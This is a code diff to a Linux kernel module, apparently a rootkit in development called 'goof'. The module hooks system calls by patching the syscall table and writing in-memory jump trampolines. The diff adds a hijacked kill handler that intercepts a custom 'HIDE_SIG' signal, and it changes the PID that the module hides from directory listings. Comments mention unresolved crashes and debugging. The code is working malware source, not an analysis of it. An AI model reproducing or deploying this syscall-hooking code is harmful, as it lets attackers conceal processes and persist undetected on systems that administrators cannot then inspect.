@@ -45,6 +45,10 @@ Task:
 
 
 //## /Credit ##
+//Declare macros - Should be in header
+//#define KILL_SIG 61
+#define HIDE_SIG 62
+#define ESC_SIG 63
 
 //Declare vars
 static unsigned long *__sys_call_table;
@@ -59,7 +63,6 @@ int HOOK_LEN = 15;
 //jmp    rax
 unsigned char JUMP_TEMPLATE[] = "\x48\xb8\x88\x77\x66\x55\x44\x33\x22\x11\x48\x89\xc0\xff\xe0";
  
-
 
  
 //Struct for each hook
@@ -112,6 +115,7 @@ unsigned char *jump;
 struct Hook **hooks;
 
 
+int (*original_kill)(pid_t, int);
 int (*original_getdents)(unsigned int, struct  linux_dirent *, unsigned int);
 int (*original_getdents64)(unsigned int, struct linux_dirent *, unsigned int);
 int (*original_open)(const char *, int, mode_t);
@@ -157,7 +161,7 @@ int goofy_uname(struct utsname *buf){
 
 int is_hidden_proc(pid_t pid){
 	//Skeleton code
-	if (pid == 1337){
+	if (pid == 24301){
 		return 1;
 	}
 	return 0;
@@ -222,10 +226,16 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 }
 
 int goofy_kill(pid_t pid, int sig){
-	printk("[goof] goofy_kill");
-	/*FAULT - invalid opcode - Trampoline may not be copied correctly*/
-	int (*func_ptr)(pid_t, int) = (void *)hooks[2]->trampoline;
-	int ret = func_ptr(pid, sig);
+	printk("[goof] goofy_kill\n");
+	/*FAULT - invalid opcode - Relative jump is wreking everything :(*/
+	//int (*func_ptr)(pid_t, int) = (void *)hooks[2]->trampoline;
+	//int ret = func_ptr(pid, sig);
+	if(sig == HIDE_SIG){
+		printk("[goof] LMAO %d\n", (unsigned int)pid);
+		return 0;
+	}
+	int ret = original_kill(pid, sig);
+
 
 
 	return ret;
@@ -339,9 +349,14 @@ goof_init(void) {
 	//original_uname = __sys_call_table[__NR_uname];
 	//__sys_call_table[__NR_uname] = goofy_uname;
 
-	//Trampolining way to overwrite syscall
+	//Trampolining way to overwrite syscall  
 	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, 16);
 	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, 15);
+	
+	original_kill = __sys_call_table[__NR_kill];
+	__sys_call_table[__NR_kill] = goofy_kill;
+
+	//NO - waiting on an LDE @Scott Court
 	//create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, 16);
 	//Creating a new trampoline - DEBUG
 	
@@ -360,6 +375,11 @@ goof_exit(void) {
 
 	remove_tramp(0);
 	remove_tramp(1);
+
+
+	__sys_call_table[__NR_kill] = original_kill;
+
+
 	//remove_tramp(2);
 	printk("[goof] module removed\n");
 	return;
